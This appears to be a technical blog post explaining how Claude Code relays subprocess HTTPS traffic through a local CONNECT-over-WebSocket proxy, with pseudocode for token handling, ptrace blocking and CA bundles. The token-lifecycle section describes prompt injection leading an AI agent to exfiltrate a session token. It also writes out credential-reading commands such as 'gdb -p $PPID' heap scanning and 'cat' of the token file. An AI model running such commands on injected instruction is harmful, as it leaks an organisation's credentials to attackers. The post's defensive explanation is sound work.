@@ -1,0 +1,567 @@
+<!DOCTYPE html><html lang="en" data-astro-cid-bvzihdzo> <head><!-- Google Analytics --><script async src="https://www.googletagmanager.com/gtag/js?id=G-87345ZT63C"></script> <script type="module">window.dataLayer=window.dataLayer||[];function a(){dataLayer.push(arguments)}a("js",new Date);a("config","G-87345ZT63C");</script> <!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="icon" href="/favicon.ico"><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="Laurent DeSegur" href="https://oldeucryptoboi.com/rss.xml"><meta name="generator" content="Astro v5.18.0"><meta name="google-site-verification" content="52SuCTLEd4SGPIPPtQYzdw7gQmWY1-O4AIzqO-d37GM"><!-- Font preloads --><link rel="preload" href="/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Oswald:wght@700&display=swap" rel="stylesheet"><!-- Canonical URL --><link rel="canonical" href="https://oldeucryptoboi.com/blog/upstream-proxy-deep-dive/"><!-- Primary Meta Tags --><title>The Upstream Proxy: How Claude Code Intercepts Subprocess HTTP Traffic</title><meta name="title" content="The Upstream Proxy: How Claude Code Intercepts Subprocess HTTP Traffic"><meta name="description" content="Claude Code relays subprocess HTTPS over WebSocket to a cloud gateway. Inside: anti-ptrace token defense, protobuf wire format, and dual-runtime TCP servers."><!-- Open Graph / Facebook --><meta property="og:type" content="article"><meta property="og:url" content="https://oldeucryptoboi.com/blog/upstream-proxy-deep-dive/"><meta property="og:title" content="The Upstream Proxy: How Claude Code Intercepts Subprocess HTTP Traffic"><meta property="og:description" content="Claude Code relays subprocess HTTPS over WebSocket to a cloud gateway. Inside: anti-ptrace token defense, protobuf wire format, and dual-runtime TCP servers."><meta property="og:site_name" content="Laurent DeSegur"><meta property="article:published_time" content="2026-04-08T00:00:00.000Z"><meta property="article:tag" content="Claude Code"><meta property="article:tag" content="Anthropic"><meta property="article:tag" content="Architecture"><meta property="article:tag" content="Security"><meta property="article:tag" content="Networking"><meta property="article:author" content="https://oldeucryptoboi.com/about"><!-- Twitter --><meta name="twitter:card" content="summary"><meta name="twitter:url" content="https://oldeucryptoboi.com/blog/upstream-proxy-deep-dive/"><meta name="twitter:title" content="The Upstream Proxy: How Claude Code Intercepts Subprocess HTTP Traffic"><meta name="twitter:description" content="Claude Code relays subprocess HTTPS over WebSocket to a cloud gateway. Inside: anti-ptrace token defense, protobuf wire format, and dual-runtime TCP servers."><meta name="twitter:site" content="@oldeucryptoboi"><meta name="twitter:creator" content="@oldeucryptoboi"><!-- JSON-LD Structured Data --><script type="application/ld+json">{"@context":"https://schema.org","@type":"Person","name":"Laurent DeSegur","url":"https://oldeucryptoboi.com","description":"AI agents, deterministic runtimes, and the code that runs them. Building KarnEvil9, Tarkus, and X/LAID.","sameAs":["https://x.com/oldeucryptoboi","https://github.com/oldeucryptoboi","https://oldeucryptoboi.substack.com"],"knowsAbout":["AI Agents","AI Governance","AI Safety","Deterministic Runtimes","Multi-Agent Systems","TypeScript","Open Source"]}</script><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"The Upstream Proxy: How Claude Code Intercepts Subprocess HTTP Traffic","description":"Claude Code relays subprocess HTTPS over WebSocket to a cloud gateway. Inside: anti-ptrace token defense, protobuf wire format, and dual-runtime TCP servers.","url":"https://oldeucryptoboi.com/blog/upstream-proxy-deep-dive/","datePublished":"2026-04-08T00:00:00.000Z","author":{"@type":"Person","name":"Laurent DeSegur","url":"https://oldeucryptoboi.com"},"publisher":{"@type":"Person","name":"Laurent DeSegur","url":"https://oldeucryptoboi.com"},"keywords":"Claude Code, Anthropic, Architecture, Security, Networking","mainEntityOfPage":{"@type":"WebPage","@id":"https://oldeucryptoboi.com/blog/upstream-proxy-deep-dive/"}}</script><link rel="stylesheet" href="/_astro/_slug_.WqGW7rbB.css">
+<style>main[data-astro-cid-bvzihdzo]{width:calc(100% - 2em);max-width:100%;margin:0}.prose[data-astro-cid-bvzihdzo]{width:740px;max-width:calc(100% - 2em);margin:auto;padding:1em;color:var(--text)}.article-header[data-astro-cid-bvzihdzo]{margin-bottom:2em;padding:2em 0;border-bottom:1px solid var(--border)}.article-header[data-astro-cid-bvzihdzo] .date[data-astro-cid-bvzihdzo]{color:var(--text-dim);font-size:.8em;letter-spacing:.04em;margin-bottom:.75em}.article-header[data-astro-cid-bvzihdzo] .last-updated-on[data-astro-cid-bvzihdzo]{font-style:italic}.article-header[data-astro-cid-bvzihdzo] h1[data-astro-cid-bvzihdzo]{margin:0;font-size:2em;color:#e0e0e0;text-transform:none;letter-spacing:.02em;line-height:1.25}.tags[data-astro-cid-bvzihdzo]{display:flex;gap:.5em;flex-wrap:wrap;margin-top:1em}.tags[data-astro-cid-bvzihdzo] span[data-astro-cid-bvzihdzo]{font-size:.65em;padding:.15em .5em;border:1px solid var(--border-light);color:var(--text-dim);letter-spacing:.04em;text-transform:uppercase;font-family:Atkinson,sans-serif}.post-nav[data-astro-cid-bvzihdzo]{display:flex;justify-content:space-between;margin-top:3em;padding-top:2em;border-top:1px solid var(--border);gap:2em}.nav-link[data-astro-cid-bvzihdzo]{display:flex;flex-direction:column;gap:.3em;text-decoration:none;max-width:45%;transition:background .15s ease}.nav-link[data-astro-cid-bvzihdzo]:hover .nav-title[data-astro-cid-bvzihdzo]{color:var(--hal-red)}.nav-next[data-astro-cid-bvzihdzo]{text-align:right;margin-left:auto}.nav-label[data-astro-cid-bvzihdzo]{font-size:.7em;color:var(--text-dim);letter-spacing:.08em;text-transform:uppercase;font-family:Atkinson,sans-serif}.nav-title[data-astro-cid-bvzihdzo]{color:var(--text);font-size:.9em;line-height:1.4;transition:color .15s ease}.subscribe-cta[data-astro-cid-bvzihdzo]{margin-top:3em;padding:1.5em;border:1px solid var(--border);text-align:center}.subscribe-cta[data-astro-cid-bvzihdzo] p[data-astro-cid-bvzihdzo]{margin:0 0 .75em;color:var(--text-dim);font-size:.85em;letter-spacing:.04em}.subscribe-cta[data-astro-cid-bvzihdzo] a[data-astro-cid-bvzihdzo]{color:var(--hal-red);font-size:.8em;letter-spacing:.08em;text-transform:uppercase;font-family:Atkinson,sans-serif;text-decoration:none;transition:color .15s ease}.subscribe-cta[data-astro-cid-bvzihdzo] a[data-astro-cid-bvzihdzo]:hover{color:#fff}@media(max-width:720px){.post-nav[data-astro-cid-bvzihdzo]{flex-direction:column;gap:1.5em}.nav-link[data-astro-cid-bvzihdzo]{max-width:100%}.nav-next[data-astro-cid-bvzihdzo]{text-align:left}}
+</style></head> <body data-astro-cid-bvzihdzo> <header data-astro-cid-3ef6ksr2> <nav data-astro-cid-3ef6ksr2> <a class="site-title" href="/" data-astro-cid-3ef6ksr2> <span class="hal-eye" data-astro-cid-3ef6ksr2></span> <span data-astro-cid-3ef6ksr2><span class="cap" data-astro-cid-3ef6ksr2>L</span>aurent <span class="cap" data-astro-cid-3ef6ksr2>D</span>e<span class="cap" data-astro-cid-3ef6ksr2>S</span>egur</span> </a> <div class="internal-links" data-astro-cid-3ef6ksr2> <a href="/" data-astro-cid-3ef6ksr2="true" data-astro-cid-eimmu3lg> Home </a>  <a href="/blog" class="active" data-astro-cid-3ef6ksr2="true" data-astro-cid-eimmu3lg> Blog </a>  <a href="/projects" data-astro-cid-3ef6ksr2="true" data-astro-cid-eimmu3lg> Projects </a>  <a href="/course" data-astro-cid-3ef6ksr2="true" data-astro-cid-eimmu3lg> Course </a>  <a href="/consulting" data-astro-cid-3ef6ksr2="true" data-astro-cid-eimmu3lg> Consulting </a>  <a href="/about" data-astro-cid-3ef6ksr2="true" data-astro-cid-eimmu3lg> About </a>  </div> <div class="social-links" data-astro-cid-3ef6ksr2> <a href="https://x.com/oldeucryptoboi" target="_blank" aria-label="X" data-astro-cid-3ef6ksr2> <svg viewBox="0 0 24 24" width="18" height="18" data-astro-cid-3ef6ksr2><path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" data-astro-cid-3ef6ksr2></path></svg> </a> <a href="https://oldeucryptoboi.substack.com" target="_blank" aria-label="Substack" data-astro-cid-3ef6ksr2> <svg viewBox="0 0 24 24" width="18" height="18" data-astro-cid-3ef6ksr2><path fill="currentColor" d="M22.539 8.242H1.46V5.406h21.08v2.836zM1.46 10.812V24L12 18.11 22.54 24V10.812H1.46zM22.54 0H1.46v2.836h21.08V0z" data-astro-cid-3ef6ksr2></path></svg> </a> <a href="https://github.com/oldeucryptoboi" target="_blank" aria-label="GitHub" data-astro-cid-3ef6ksr2> <svg viewBox="0 0 16 16" width="18" height="18" data-astro-cid-3ef6ksr2><path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" data-astro-cid-3ef6ksr2></path></svg> </a> </div> </nav> </header>  <main data-astro-cid-bvzihdzo> <article data-astro-cid-bvzihdzo> <div class="prose" data-astro-cid-bvzihdzo> <div class="article-header" data-astro-cid-bvzihdzo> <div class="date" data-astro-cid-bvzihdzo> <time datetime="2026-04-08T00:00:00.000Z"> Apr 8, 2026 </time>  </div> <h1 data-astro-cid-bvzihdzo>The Upstream Proxy: How Claude Code Intercepts Subprocess HTTP Traffic</h1> <div class="tags" data-astro-cid-bvzihdzo> <span data-astro-cid-bvzihdzo>Claude Code</span><span data-astro-cid-bvzihdzo>Anthropic</span><span data-astro-cid-bvzihdzo>Architecture</span><span data-astro-cid-bvzihdzo>Security</span><span data-astro-cid-bvzihdzo>Networking</span> </div> </div>  <h1 id="the-upstream-proxy-how-claude-code-intercepts-subprocess-http-traffic">The Upstream Proxy: How Claude Code Intercepts Subprocess HTTP Traffic</h1>
+<p>When Claude Code runs in a cloud container, every subprocess it spawns — <code>curl</code>, <code>gh</code>, <code>python</code>, <code>kubectl</code> — needs to reach external services. But the container sits behind an organization’s security perimeter. The org needs to inject credentials (API keys, auth headers) into outbound HTTPS requests, log traffic for compliance, and block unauthorized endpoints. The subprocess doesn’t know any of this. It just wants to <code>curl https://api.datadog.com</code>.</p>
+<p>The naive solution: configure a corporate proxy and trust that every tool respects <code>HTTPS_PROXY</code>. But that only works if the tool trusts the proxy’s TLS certificate. A corporate proxy that inspects HTTPS traffic presents its own certificate — a man-in-the-middle certificate that <code>curl</code> and <code>python</code> will reject unless they trust the issuing CA. Every runtime has its own CA trust store: Node uses <code>NODE_EXTRA_CA_CERTS</code>, Python uses <code>REQUESTS_CA_BUNDLE</code> or <code>SSL_CERT_FILE</code>, curl uses <code>CURL_CA_BUNDLE</code>, Go uses the system store. Miss one and the subprocess fails with <code>CERTIFICATE_VERIFY_FAILED</code>.</p>
+<p>And there’s a deeper problem. The container’s ingress is a GKE L7 load balancer with path-prefix routing. It doesn’t support raw HTTP CONNECT tunnels — the standard way proxies handle HTTPS. You can’t just point <code>HTTPS_PROXY</code> at the ingress and expect CONNECT to work. The infrastructure needs a different transport.</p>
+<p>Claude Code solves this with an <strong>upstream proxy relay</strong>: a local TCP server that accepts standard HTTP CONNECT requests from subprocesses, tunnels the bytes over WebSocket to the cloud gateway, and lets the gateway handle TLS interception and credential injection. The relay runs inside the container, bound to localhost, invisible to the agent. Subprocesses see a standard HTTPS proxy at <code>127.0.0.1:&#x3C;port></code> and a CA bundle that trusts both the system CAs and the gateway’s MITM certificate.</p>
+<p>This article traces every layer: the initialization sequence, the token lifecycle, the anti-ptrace defense, the CA certificate chain, the CONNECT-over-WebSocket protocol, the protobuf wire format, the NO_PROXY bypass list, and the subprocess environment injection that ties it all together.</p>
+<hr>
+<h2 id="when-does-this-activate">When Does This Activate?</h2>
+<p>The upstream proxy is a CCR (Cloud Code Runtime) feature. It only activates when three conditions are met:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>function initUpstreamProxy():</span></span>
+<span class="line"><span>    # Gate 1: Are we in a cloud container?</span></span>
+<span class="line"><span>    if not env.CLAUDE_CODE_REMOTE:</span></span>
+<span class="line"><span>        return disabled</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    # Gate 2: Has the server enabled the proxy for this session?</span></span>
+<span class="line"><span>    if not env.CCR_UPSTREAM_PROXY_ENABLED:</span></span>
+<span class="line"><span>        return disabled</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    # Gate 3: Do we have a session ID?</span></span>
+<span class="line"><span>    if not env.CLAUDE_CODE_REMOTE_SESSION_ID:</span></span>
+<span class="line"><span>        return disabled</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    # Gate 4: Is there a session token on disk?</span></span>
+<span class="line"><span>    token = readFile("/run/ccr/session_token")</span></span>
+<span class="line"><span>    if not token:</span></span>
+<span class="line"><span>        return disabled</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    # All gates passed — proceed with initialization</span></span>
+<span class="line"><span>    ...</span></span></code></pre>
+<p>The <code>CCR_UPSTREAM_PROXY_ENABLED</code> flag is evaluated server-side, where the feature flag system has warm caches. The container gets a fresh environment with no cached flags, so a client-side check would always return the default (false). The server makes the decision and injects the result into the container’s environment.</p>
+<p>Every subsequent step fails open: if anything goes wrong — CA download fails, relay can’t bind, WebSocket connection breaks — the proxy is disabled and the session continues without it. A broken proxy setup must never break an otherwise-working session.</p>
+<hr>
+<h2 id="the-token-lifecycle">The Token Lifecycle</h2>
+<p>The session token authenticates the relay to the cloud gateway. Its lifecycle is designed around a single threat: <strong>prompt injection leading to token exfiltration</strong>.</p>
+<p>The attack scenario: Claude Code runs user-provided code. A malicious prompt tricks the model into executing a shell command that reads the token and sends it to an attacker-controlled server. With the token, the attacker can impersonate the session and access the organization’s internal services through the proxy.</p>
+<p>The defense is a four-step sequence:</p>
+<h3 id="step-1-read-the-token">Step 1: Read the Token</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>token = readFile("/run/ccr/session_token")</span></span></code></pre>
+<p>The CCR orchestrator writes the token to a tmpfs mount at container startup. It’s readable by the process user and exists only in memory-backed storage — never on a persistent disk.</p>
+<h3 id="step-2-block-ptrace">Step 2: Block ptrace</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>function setNonDumpable():</span></span>
+<span class="line"><span>    if platform is not linux:</span></span>
+<span class="line"><span>        return  # only Linux has prctl</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    lib = dlopen("libc.so.6")</span></span>
+<span class="line"><span>    PR_SET_DUMPABLE = 4</span></span>
+<span class="line"><span>    lib.prctl(PR_SET_DUMPABLE, 0, 0, 0, 0)</span></span></code></pre>
+<p>This is the critical security step. <code>prctl(PR_SET_DUMPABLE, 0)</code> tells the Linux kernel that this process cannot be ptrace’d by any process running as the same UID. Without this, a prompt-injected command like <code>gdb -p $PPID -batch -ex 'find ...'</code> could attach to the Claude Code process, scan its heap, and extract the token from memory.</p>
+<p>The call uses Bun’s FFI (Foreign Function Interface) to directly invoke <code>prctl</code> from libc. It runs on Linux only; on other platforms it silently no-ops. If the FFI call itself fails (wrong libc path, missing symbol), it logs a warning and continues — fail-open, because blocking the entire session over a defense-in-depth measure would be wrong.</p>
+<h3 id="step-3-start-the-relay">Step 3: Start the Relay</h3>
+<p>The relay binds to localhost and begins accepting CONNECT requests. Only after the relay is confirmed listening does step 4 proceed.</p>
+<h3 id="step-4-unlink-the-token-file">Step 4: Unlink the Token File</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>await unlink("/run/ccr/session_token")</span></span>
+<span class="line"><span># Token is now heap-only — file is gone</span></span></code></pre>
+<p>The token file is deleted from disk. The token now exists only in the process’s heap memory, protected by <code>PR_SET_DUMPABLE</code>. A subprocess can’t <code>cat /run/ccr/session_token</code> because the file no longer exists. It can’t <code>gdb -p $PPID</code> because ptrace is blocked.</p>
+<p>The ordering is deliberate: unlink happens AFTER the relay is confirmed up. If the CA download or relay startup fails, the token file remains on disk so a supervisor restart can retry the full initialization. Once the relay is running, the file is expendable.</p>
+<p>Why not just use environment variables? Because environment variables are readable by any subprocess via <code>/proc/$PPID/environ</code>. The token would be trivially exfiltrable. The heap-only approach requires ptrace, which <code>PR_SET_DUMPABLE</code> blocks.</p>
+<hr>
+<h2 id="the-ca-certificate-chain">The CA Certificate Chain</h2>
+<p>The cloud gateway terminates TLS on behalf of the real upstream server and presents its own certificate. Subprocesses need to trust this certificate. The system downloads the gateway’s CA certificate and creates a merged bundle:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>function downloadCaBundle(baseUrl, systemCaPath, outPath):</span></span>
+<span class="line"><span>    # Download the gateway's CA cert from the Anthropic API</span></span>
+<span class="line"><span>    response = fetch(baseUrl + "/v1/code/upstreamproxy/ca-cert",</span></span>
+<span class="line"><span>                     timeout: 5000)</span></span>
+<span class="line"><span>    if response not ok:</span></span>
+<span class="line"><span>        return false  # fail-open: proxy disabled</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    gatewayCa = response.text()</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    # Read the system's existing CA bundle</span></span>
+<span class="line"><span>    systemCa = readFile("/etc/ssl/certs/ca-certificates.crt")</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    # Concatenate: system CAs first, gateway CA appended</span></span>
+<span class="line"><span>    mkdir(dirname(outPath))</span></span>
+<span class="line"><span>    writeFile(outPath, systemCa + "\n" + gatewayCa)</span></span>
+<span class="line"><span>    # outPath = ~/.ccr/ca-bundle.crt</span></span>
+<span class="line"><span>    return true</span></span></code></pre>
+<p>The merged bundle goes to <code>~/.ccr/ca-bundle.crt</code>. Subprocesses get this path via four environment variables, covering every major runtime’s CA discovery mechanism:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Variable</th><th>Runtime</th></tr></thead><tbody><tr><td><code>SSL_CERT_FILE</code></td><td>curl, OpenSSL-based tools</td></tr><tr><td><code>NODE_EXTRA_CA_CERTS</code></td><td>Node.js</td></tr><tr><td><code>REQUESTS_CA_BUNDLE</code></td><td>Python requests/httpx</td></tr><tr><td><code>CURL_CA_BUNDLE</code></td><td>curl (alternative)</td></tr></tbody></table>
+<p>The 5-second fetch timeout is deliberate. Bun has no default fetch timeout — without one, a hung CA endpoint would block CLI startup forever. 5 seconds is generous for a small PEM file.</p>
+<hr>
+<h2 id="the-connect-over-websocket-relay">The CONNECT-over-WebSocket Relay</h2>
+<p>The relay is the core of the system. It translates standard HTTP CONNECT requests into WebSocket tunnels that the cloud gateway can route.</p>
+<h3 id="why-websocket">Why WebSocket?</h3>
+<p>The CCR ingress is a GKE L7 load balancer with path-prefix routing. L7 load balancers inspect HTTP requests and route based on URL paths. HTTP CONNECT is a different protocol — it asks the proxy to establish a raw TCP tunnel, which L7 load balancers typically can’t route. There’s no <code>connect_matcher</code> in the CDK constructs.</p>
+<p>WebSocket, however, is an HTTP upgrade — it starts as a normal HTTP request (routable by L7) and then upgrades to a bidirectional binary channel. The session ingress tunnel already uses this pattern. The upstream proxy follows suit.</p>
+<h3 id="the-protocol">The Protocol</h3>
+<p>The relay listens on <code>127.0.0.1:0</code> (ephemeral port) and handles each connection through a two-phase state machine:</p>
+<p><strong>Phase 1: CONNECT Accumulation</strong></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>function handleData(socket, state, data):</span></span>
+<span class="line"><span>    if no WebSocket exists yet:</span></span>
+<span class="line"><span>        # Accumulate bytes until we see the full CONNECT header</span></span>
+<span class="line"><span>        state.connectBuf = concat(state.connectBuf, data)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>        headerEnd = indexOf(state.connectBuf, "\r\n\r\n")</span></span>
+<span class="line"><span>        if headerEnd is -1:</span></span>
+<span class="line"><span>            # Guard: reject if header exceeds 8KB (not a real CONNECT)</span></span>
+<span class="line"><span>            if length(state.connectBuf) > 8192:</span></span>
+<span class="line"><span>                socket.write("HTTP/1.1 400 Bad Request\r\n\r\n")</span></span>
+<span class="line"><span>                socket.end()</span></span>
+<span class="line"><span>            return</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>        # Parse the CONNECT line</span></span>
+<span class="line"><span>        firstLine = state.connectBuf[0:headerEnd].split("\r\n")[0]</span></span>
+<span class="line"><span>        match = regex("CONNECT (\S+) HTTP/1.[01]", firstLine)</span></span>
+<span class="line"><span>        if no match:</span></span>
+<span class="line"><span>            socket.write("HTTP/1.1 405 Method Not Allowed\r\n\r\n")</span></span>
+<span class="line"><span>            socket.end()</span></span>
+<span class="line"><span>            return</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>        # Save any bytes that arrived after the header</span></span>
+<span class="line"><span>        # (TCP can coalesce CONNECT + TLS ClientHello in one packet)</span></span>
+<span class="line"><span>        trailing = state.connectBuf[headerEnd + 4:]</span></span>
+<span class="line"><span>        if trailing is not empty:</span></span>
+<span class="line"><span>            state.pending.push(trailing)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>        openTunnel(socket, state, firstLine)</span></span></code></pre>
+<p>The 8KB guard prevents a misbehaving client from filling memory with a never-terminating header. The 405 response handles non-CONNECT methods — the relay only does CONNECT, not GET/POST. The trailing-bytes buffer handles TCP coalescing, where the client’s CONNECT request and TLS ClientHello arrive in the same TCP segment.</p>
+<p><strong>Phase 2: WebSocket Tunnel</strong></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>function openTunnel(socket, state, connectLine):</span></span>
+<span class="line"><span>    # Open WebSocket to the cloud gateway</span></span>
+<span class="line"><span>    ws = new WebSocket(wsUrl, {</span></span>
+<span class="line"><span>        headers: {</span></span>
+<span class="line"><span>            "Content-Type": "application/proto",</span></span>
+<span class="line"><span>            "Authorization": "Bearer &#x3C;session-token>"</span></span>
+<span class="line"><span>        }</span></span>
+<span class="line"><span>    })</span></span>
+<span class="line"><span>    ws.binaryType = "arraybuffer"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    ws.onopen = ():</span></span>
+<span class="line"><span>        # Send the CONNECT line + auth to the gateway</span></span>
+<span class="line"><span>        head = connectLine + "\r\n"</span></span>
+<span class="line"><span>             + "Proxy-Authorization: Basic &#x3C;sessionId:token>\r\n"</span></span>
+<span class="line"><span>             + "\r\n"</span></span>
+<span class="line"><span>        ws.send(encodeChunk(head))</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>        # Flush any bytes buffered during WS handshake</span></span>
+<span class="line"><span>        state.wsOpen = true</span></span>
+<span class="line"><span>        for buf in state.pending:</span></span>
+<span class="line"><span>            forwardToWs(ws, buf)</span></span>
+<span class="line"><span>        state.pending = []</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>        # Start keepalive pings (30-second interval)</span></span>
+<span class="line"><span>        state.pinger = setInterval(sendKeepalive, 30000, ws)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    ws.onmessage = (event):</span></span>
+<span class="line"><span>        payload = decodeChunk(event.data)</span></span>
+<span class="line"><span>        if payload and payload.length > 0:</span></span>
+<span class="line"><span>            state.established = true</span></span>
+<span class="line"><span>            socket.write(payload)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    ws.onerror = (event):</span></span>
+<span class="line"><span>        if not state.established:</span></span>
+<span class="line"><span>            socket.write("HTTP/1.1 502 Bad Gateway\r\n\r\n")</span></span>
+<span class="line"><span>        socket.end()</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    ws.onclose = ():</span></span>
+<span class="line"><span>        socket.end()</span></span></code></pre>
+<p>There are two authentication layers. The WebSocket upgrade carries a <code>Bearer</code> token — the gateway requires session-level auth on the upgrade request itself (proto authn: PRIVATE_API). Inside the tunnel, the CONNECT request carries <code>Proxy-Authorization: Basic</code> with the session ID and token — this authenticates the specific tunnel and tells the gateway which target host:port to connect to.</p>
+<h3 id="the-content-type-trap">The Content-Type Trap</h3>
+<p>The WebSocket connection must set <code>Content-Type: application/proto</code>. Without it, the server’s Go code treats the chunks as JSON and attempts <code>protojson.Unmarshal</code> on the hand-encoded binary — which silently fails with EOF, producing no error but also no tunnel. This was presumably discovered through debugging, not design.</p>
+<h3 id="keepalive">Keepalive</h3>
+<p>The sidecar proxy has a 50-second idle timeout. The relay sends an empty protobuf chunk (zero-length data field) every 30 seconds as an application-level keepalive. Not all WebSocket implementations expose <code>ping()</code>, so the empty chunk serves as a universal keepalive that the server can ignore.</p>
+<h3 id="the-pending-buffer">The Pending Buffer</h3>
+<p>Between parsing the CONNECT header and the WebSocket connection becoming open, bytes can keep arriving. The subprocess’s TLS library doesn’t wait for the proxy handshake — it can send the TLS ClientHello immediately after the CONNECT request, sometimes in the same TCP packet (kernel coalescing), sometimes in a separate data event that fires before <code>ws.onopen</code>.</p>
+<p>Without buffering, these bytes would be silently dropped. The relay tracks a <code>pending</code> array: any data that arrives after the CONNECT parse but before <code>wsOpen</code> is true gets pushed to pending. When <code>onopen</code> fires, pending is flushed in order. This handles both sources of early data:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># TCP coalescing: CONNECT + ClientHello in one packet</span></span>
+<span class="line"><span>data = [CONNECT api.example.com:443 HTTP/1.1\r\n\r\n][TLS ClientHello...]</span></span>
+<span class="line"><span>                                                       ^--- trailing bytes → pending</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Async race: data event fires before onopen</span></span>
+<span class="line"><span>ws = new WebSocket(...)   # handshake in flight</span></span>
+<span class="line"><span># ... socket data callback fires with TLS bytes ...</span></span>
+<span class="line"><span>if not wsOpen:</span></span>
+<span class="line"><span>    pending.push(data)    # buffered, not lost</span></span></code></pre>
+<h3 id="the-websocket-url">The WebSocket URL</h3>
+<p>The relay constructs the WebSocket URL from the API base URL with a simple transform:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>wsUrl = baseUrl.replace("http", "ws") + "/v1/code/upstreamproxy/ws"</span></span>
+<span class="line"><span># https://api.anthropic.com → wss://api.anthropic.com/v1/code/upstreamproxy/ws</span></span>
+<span class="line"><span># http://localhost:8080     → ws://localhost:8080/v1/code/upstreamproxy/ws</span></span></code></pre>
+<p>The <code>replace</code> catches both <code>http→ws</code> and <code>https→wss</code> because the regex matches only the first occurrence. The server-side endpoint path mirrors the REST API namespace.</p>
+<h3 id="the-502-boundary">The 502 Boundary</h3>
+<p>The relay only sends <code>HTTP/1.1 502 Bad Gateway</code> if the tunnel hasn’t been established yet. Once the first server response has been forwarded (the <code>200 Connection Established</code>), the connection is carrying TLS. Writing a plaintext HTTP error into a TLS stream would corrupt the client’s connection. After establishment, the relay just closes the socket silently.</p>
+<p>A <code>closed</code> flag prevents double-end: the WebSocket <code>onerror</code> event is always followed by <code>onclose</code>, and without a guard, both handlers would call <code>socket.end()</code> on an already-ended socket. The first handler to fire sets <code>closed = true</code>; the second sees the flag and returns immediately.</p>
+<hr>
+<h2 id="two-runtimes-two-tcp-servers">Two Runtimes, Two TCP Servers</h2>
+<p>Claude Code supports both Bun and Node as runtimes. The relay needs a TCP server, and the two runtimes have fundamentally different TCP APIs. Rather than abstracting behind a compatibility layer, the relay implements two complete server paths and dispatches at startup:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>function startRelay(wsUrl, authHeader, wsAuthHeader):</span></span>
+<span class="line"><span>    if typeof Bun is not undefined:</span></span>
+<span class="line"><span>        return startBunRelay(wsUrl, authHeader, wsAuthHeader)</span></span>
+<span class="line"><span>    else:</span></span>
+<span class="line"><span>        return startNodeRelay(wsUrl, authHeader, wsAuthHeader)</span></span></code></pre>
+<h3 id="the-bun-path">The Bun Path</h3>
